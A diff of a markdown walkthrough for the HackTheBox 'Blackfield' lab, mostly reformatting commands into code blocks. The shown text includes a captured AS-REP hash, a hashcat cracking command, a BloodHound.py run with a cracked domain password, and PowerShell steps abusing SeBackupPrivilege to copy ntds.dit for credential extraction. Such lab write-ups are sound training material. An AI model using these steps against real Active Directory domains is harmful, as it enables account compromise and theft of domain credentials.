@@ -90,7 +90,9 @@ $krb5asrep$23$support@BLACKFIELD.LOCAL:17bc70e610b036b35661ef81b9d57219$13aceded
 
 We can use `hashcat` for crack the HASH using module 18200.
 
-`hashcat -m 18200 -a 0 AS-REP ~/Desktop/htb-tool/rockyou.txt`
+```bash
+hashcat -m 18200 -a 0 AS-REP ~/Desktop/htb-tool/rockyou.txt
+```
 
 ![](/assets/img/blackfield/3.png)
 
@@ -102,7 +104,9 @@ notif from hashcat successfully crack the hash with status cracked, now im gonna
 
 we still dont have any access to this share, for further i will use [Bloodhound.py](https://github.com/fox-it/BloodHound.py) to collect information regarding targets.
 
-`./bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all`
+```bash
+./bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all
+```
 
 ![](/assets/img/blackfield/5.png)
 
@@ -208,7 +212,7 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 Import-Module .\SeBackupPrivilegeUtils.dll
 ```
 
-after the backup process is complete we need to copy ntds.dit from Z drive into C:\temp\, and download `ntds.dit` and `system` into our host with following command: 
+after the backup process is complete we need to copy ntds.dit from Z drive into C:\temp\ folder, and download `ntds.dit` and `system` into our host with following command: 
 
 ```powershell
 Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\temp\ntds.dit -Overwrite
